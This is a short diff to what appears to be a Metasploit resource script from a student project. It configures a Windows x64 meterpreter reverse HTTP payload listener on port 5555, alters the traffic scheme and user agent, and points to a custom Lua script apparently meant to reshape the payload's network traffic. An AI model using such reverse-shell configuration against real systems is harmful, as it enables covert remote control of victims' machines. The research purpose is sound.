@@ -6,9 +6,12 @@
  use payload/windows/x64/meterpreter_reverse_http
  
  setg OverrideRequestHost true
- setg OverrideScheme mhttp
+ setg OverrideScheme httpm
  setg luri mysuperduperpath
+ setg httpuseragent aaa
 
+ setg malleablescriptpath /home/timo/Projects/bachelor/lua-testing/LUA_testing/LUA_testing/testFunction.lua
+ 
  set LPORT 5555
  
  
